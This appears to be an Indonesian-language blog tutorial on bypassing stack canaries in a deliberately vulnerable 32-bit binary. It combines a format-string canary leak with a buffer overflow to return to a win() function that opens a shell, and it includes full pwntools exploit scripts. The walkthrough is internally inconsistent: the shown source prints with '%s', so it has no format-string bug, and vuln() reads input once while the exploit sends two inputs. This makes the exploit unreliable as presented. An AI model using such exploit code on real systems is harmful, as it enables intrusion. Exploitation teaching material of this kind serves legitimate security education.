<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  
  <style>
    body {
      background-color: #2e2e2e;
      color: #c7c5c5;;
      
      font-family: 'Mono', sans-serif;  
    }


    a {
      color: #48a874;  
      text-decoration: none;
    }

    a:hover {
      color: darkgray;  
    }

    a:visited {
      color: #48a874;  
    }

    .fa {
      font-family: "Font Awesome 6 Free", sans-serif;  
      font-weight: 30px;
    }
  </style>

  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">

  
  
    <meta name="description" content="1. Basic File Checks
Lakukan pemeriksaan awal pada biner:
# Compile dengan stack canary
gcc -m32 -fstack-protector-all bof4.c -o bof4

# Periksa properti file
file bof4
checksec bof4
Output:
bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] &#39;/home/user/bof4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanpa PIE (alamat fungsi statis).">
  

  <title>
    
      Bypassing Stack Canaries (Leak &#43; Write) - Pwn03.1
    
  </title>

  
  <link rel="shortcut icon" type="image/x-icon" href="/" />

  
  
  
  
  <link rel="stylesheet" href="/css/main.4b550348a06e41cd2fba1e1b4d6c5f337b2e882272420967996967c3baf38431563db8a42628c2eaecddc97c9cc0103749db58a82a4cfb5c1361495dd9dd57b0.css" integrity="sha512-S1UDSKBuQc0vuh4bTWxfM3suiCJyQglnmWlnw7rzhDFWPbikJijC6uzdyXycwBA3SdtYqCpM&#43;1wTYUld2d1XsA==" />

  
  

  
    <meta name="description" content="1. Basic File Checks
Lakukan pemeriksaan awal pada biner:
# Compile dengan stack canary
gcc -m32 -fstack-protector-all bof4.c -o bof4

# Periksa properti file
file bof4
checksec bof4
Output:
bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] &#39;/home/user/bof4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanpa PIE (alamat fungsi statis).">
    <meta property="og:description" content="1. Basic File Checks
Lakukan pemeriksaan awal pada biner:
# Compile dengan stack canary
gcc -m32 -fstack-protector-all bof4.c -o bof4

# Periksa properti file
file bof4
checksec bof4
Output:
bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] &#39;/home/user/bof4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanpa PIE (alamat fungsi statis).">
    <meta property="og:image" content="/path/to/default-image.jpg">
    <meta name="twitter:image" content="/path/to/default-image.jpg">

  <meta property="og:type" content="article">
  <meta property="og:url" content="/posts/bypass-stack-canary/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Bypassing Stack Canaries (Leak &#43; Write) - Pwn03.1">
  <meta name="twitter:description" content="1. Basic File Checks
Lakukan pemeriksaan awal pada biner:
# Compile dengan stack canary
gcc -m32 -fstack-protector-all bof4.c -o bof4

# Periksa properti file
file bof4
checksec bof4
Output:
bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] &#39;/home/user/bof4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanpa PIE (alamat fungsi statis).">
</head>











<body a="black">

        <main class="page-content" aria-label="Content">
            <div class="w">
<a href="/">~ $ cd /home</a>


<article>
    <p class="post-meta">
    </p>

<h1>Bypassing Stack Canaries (Leak &#43; Write) - Pwn03.1<br><br>
    <small datetime="2025-08-20 00:00:00 &#43;0000 UTC" style="font-size: 10px; display: inline-flex; align-items: center;">
        <img src="https://avatars.githubusercontent.com/u/51517043?v=4" alt="GitHub Profile" style="width: 30px; height: 30px; border-radius: 50%; object-fit: cover; margin-right: 8px;">
        2025-08-20 - Rainhynn
    </small>
</h1>

    

    <h2 id="1-basic-file-checks">1. Basic File Checks</h2>
<p>Lakukan pemeriksaan awal pada biner:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Compile dengan stack canary</span>
</span></span><span style="display:flex;"><span>gcc -m32 -fstack-protector-all bof4.c -o bof4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Periksa properti file</span>
</span></span><span style="display:flex;"><span>file bof4
</span></span><span style="display:flex;"><span>checksec bof4
</span></span></code></pre></div><p><strong>Output:</strong></p>
<pre tabindex="0"><code>bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] &#39;/home/user/bof4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p><strong>Kesimpulan:</strong> Biner 32-bit dengan proteksi <strong>Stack Canary</strong> dan <strong>NX Enabled</strong>, namun tanpa PIE (alamat fungsi statis).</p>
<h2 id="2-review-source-code">2. Review Source Code</h2>
<p><strong>bof4.c:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">win</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Congrats, you bypassed the canary!</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">system</span>(<span style="color:#87ceeb">&#34;/bin/sh&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">64</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Level 4: Canary is enabled. Can you bypass it?&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Input: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">fgets</span>(buf, <span style="color:#f60">256</span>, stdin);  <span style="color:#0f0">// VULNERABILITY: Buffer overflow!
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;You said: %s</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, buf); <span style="color:#0f0">// VULNERABILITY: Format string
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">vuln</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Exiting...&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>Vulnerabilities:</strong></p>
<ol>
<li><strong>Buffer Overflow:</strong> <code>fgets</code> membaca 256 byte ke buffer 64 byte.</li>
<li><strong>Format String:</strong> <code>printf(buf)</code> memungkinkan leak data dari stack.</li>
</ol>
<p><strong>Target:</strong> Eksploitasi untuk menjalankan fungsi <code>win()</code>.</p>
<h2 id="3-analisis-assembly-dengan-pwndbg">3. Analisis Assembly dengan pwndbg</h2>
<p>Breakdown fungsi <code>vuln</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb ./bof4
</span></span><span style="display:flex;"><span>disass vuln
</span></span></code></pre></div><p><strong>Output Penting:</strong></p>
<pre tabindex="0"><code>   0x080491d4 &lt;+18&gt;:    mov    eax,gs:0x14        ; Load canary dari TLS
   0x080491da &lt;+24&gt;:    mov    DWORD PTR [ebp-0xc],eax ; Simpan canary di [ebp-0xc]
   ...
   0x08049218 &lt;+86&gt;:    call   0x8049060 &lt;fgets@plt&gt; ; fgets(buf, 256, stdin)
   ...
   0x08049233 &lt;+113&gt;:   xor    eax,DWORD PTR gs:0x14 ; Verifikasi canary
   0x0804923a &lt;+120&gt;:   je     0x8049241 &lt;vuln+127&gt;   ; Jika valid, lanjutkan
   0x0804923c &lt;+122&gt;:   call   0x80490a0 &lt;__stack_chk_fail_local&gt; ; Jika corrupt, abort
</code></pre><p><strong>Layout Stack di <code>vuln()</code>:</strong></p>
<table>
  <thead>
      <tr>
          <th>Alamat Relatif</th>
          <th>Konten</th>
          <th>Ukuran</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>ebp - 0x4c</code></td>
          <td><code>buf[64]</code></td>
          <td>64 byte</td>
      </tr>
      <tr>
          <td><code>ebp - 0x0c</code></td>
          <td><strong>Canary</strong></td>
          <td>4 byte</td>
      </tr>
      <tr>
          <td><code>ebp + 0x00</code></td>
          <td>Saved EBP</td>
          <td>4 byte</td>
      </tr>
      <tr>
          <td><code>ebp + 0x04</code></td>
          <td>Return Address</td>
          <td>4 byte</td>
      </tr>
  </tbody>
</table>
<p><strong>Offset Penting:</strong></p>
<ul>
<li>Start buffer ke canary: <strong>64 byte</strong></li>
<li>Start buffer ke return address: 64 + 4 (canary) + 4 (saved ebp) = <strong>72 byte</strong></li>
</ul>
<h2 id="4-strategi-exploit-canary-leak--bypass">4. Strategi Exploit: Canary Leak &amp; Bypass</h2>
<p>Langkah-langkah:</p>
<ol>
<li><strong>Leak Canary:</strong> Manfaatkan format string <code>printf(buf)</code> untuk membaca nilai canary dari stack.</li>
<li><strong>Bypass Check:</strong> Gunakan nilai canary yang telah dileak pada payload overflow agar check dapat passed.</li>
<li><strong>Hijack EIP:</strong> Timpa return address dengan alamat fungsi <code>win</code>.</li>
</ol>
<h2 id="5-langkah-1-leak-canary-via-format-string">5. Langkah 1: Leak Canary via Format String</h2>
<p>Canary disimpan di stack. Kita gunakan format specifier <code>%p</code> atau <code>$p</code> untuk membacanya.</p>
<p><strong>Fuzzing Posisi Canary:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.binary = <span style="color:#87ceeb">&#39;./bof4&#39;</span>
</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#39;./bof4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kirim payload fuzz</span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">for</span> i in range(<span style="color:#f60">1</span>, <span style="color:#f60">20</span>):
</span></span><span style="display:flex;"><span>    payload += <span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#39;%</span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">$08p &#39;</span>.encode()  <span style="color:#0f0"># %[pos]$p</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>response = p.clean()
</span></span><span style="display:flex;"><span>print(response.decode())
</span></span><span style="display:flex;"><span>p.close()
</span></span></code></pre></div><p><strong>Contoh Output:</strong></p>
<pre tabindex="0"><code>You said: 0xffffd5cc 0x00000064 0xf7f9c580 0xffffffff ... 0x5c9e1a00 ... 0xf7de4c8d
</code></pre><p>Cari nilai yang <strong>berakhiran <code>0x00</code></strong> (null byte), seperti <code>0x5c9e1a00</code>. Itu adalah canary. Misalnya ditemukan di posisi ke-13.</p>
<p><strong>Script Leak Canary:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;Input: &#34;</span>)
</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%13$p&#39;</span>  <span style="color:#0f0"># Langsung ambil dari posisi yang diduga</span>
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Parse output</span>
</span></span><span style="display:flex;"><span>leaked_line = p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;You said:&#34;</span>).split(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#39;</span>)[-<span style="color:#f60">2</span>]  <span style="color:#0f0"># Ambil baris sebelum &#34;You said:&#34;</span>
</span></span><span style="display:flex;"><span>canary = int(leaked_line, <span style="color:#f60">16</span>)  <span style="color:#0f0"># Konversi string hex ke integer</span>
</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Leaked canary: </span><span style="color:#87ceeb">{</span>hex(canary)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
</span></span></code></pre></div><h2 id="6-langkah-2--3-bangun-payload-dan-hijack-control-flow">6. Langkah 2 &amp; 3: Bangun Payload dan Hijack Control Flow</h2>
<p>Setelah canary diketahui, bangun payload overflow yang mempertahankan nilainya.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0"># Offset</span>
</span></span><span style="display:flex;"><span>offset_to_canary = <span style="color:#f60">64</span>
</span></span><span style="display:flex;"><span>offset_to_ret = offset_to_canary + <span style="color:#f60">4</span> + <span style="color:#f60">4</span>  <span style="color:#0f0"># +4 (canary) +4 (saved ebp)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Alamat win (dapat dari gdb: p win, atau objdump -t bof4 | grep win)</span>
</span></span><span style="display:flex;"><span>win_addr = <span style="color:#f60">0x80491a6</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Bangun payload</span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span> * offset_to_canary   <span style="color:#0f0"># Isi buffer</span>
</span></span><span style="display:flex;"><span>payload += p32(canary)              <span style="color:#0f0"># Timpa canary dengan nilai yang benar</span>
</span></span><span style="display:flex;"><span>payload += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;B&#39;</span> * <span style="color:#f60">4</span>                 <span style="color:#0f0"># Timpa Saved EBP (bisa junk data)</span>
</span></span><span style="display:flex;"><span>payload += p32(win_addr)            <span style="color:#0f0"># Timpa Return Address</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>p.interactive() <span style="color:#0f0"># Enjoy your shell!</span>
</span></span></code></pre></div><h2 id="7-full-exploit-script">7. Full Exploit Script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.binary = <span style="color:#87ceeb">&#39;./bof4&#39;</span>
</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;info&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#39;./bof4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># [1] LEAK CANARY</span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;Input: &#34;</span>)
</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%13$p&#39;</span>)  <span style="color:#0f0"># Ganti 13 dengan posisi canary yang sesuai</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak = p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;You said:&#34;</span>).split(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#39;</span>)[-<span style="color:#f60">2</span>]
</span></span><span style="display:flex;"><span>canary = int(leak, <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>log.success(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Canary leaked: </span><span style="color:#87ceeb">{</span>hex(canary)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># [2] BUILD OVERFLOW PAYLOAD</span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;Input: &#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>offset = <span style="color:#f60">64</span>
</span></span><span style="display:flex;"><span>win_addr = <span style="color:#f60">0x80491a6</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload = flat({
</span></span><span style="display:flex;"><span>    offset: p32(canary),  <span style="color:#0f0"># Letakkan canary yang benar di offset 64</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f60">72</span>: p32(win_addr)     <span style="color:#0f0"># Letakkan alamat win di offset 72</span>
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># [3] GET SHELL</span>
</span></span><span style="display:flex;"><span>p.interactive()
</span></span></code></pre></div><p><strong>Penjelasan <code>flat()</code>:</strong><br>
Fungsi <code>flat</code> dari pwntools secara pintar mengatur payload.</p>
<ul>
<li><code>{64: p32(canary)}</code> artinya di offset ke-64, tulis nilai canary.</li>
<li><code>{72: p32(win_addr)}</code> artinya di offset ke-72, tulis alamat <code>win</code>.</li>
<li>Area antara 64-72 (yaitu saved EBP) otomatis diisi junk data.</li>
</ul>
<p><strong>Eksekusi:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 exploit.py
</span></span><span style="display:flex;"><span>[+] Canary leaked: 0x5c9e1a00
</span></span><span style="display:flex;"><span>[*] Switching to interactive mode
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span><span style="color:#eedd82">uid</span>=1000(user) <span style="color:#eedd82">gid</span>=1000(user) <span style="color:#eedd82">groups</span>=1000(user)
</span></span><span style="display:flex;"><span>$
</span></span></code></pre></div>
</article>

<hr>

<p>© 2021-2025 HnvDie</p>
<p>Powered By Hugo ᯓᡣ𐭩</p>



            </div>
        </main>
    </body></html>
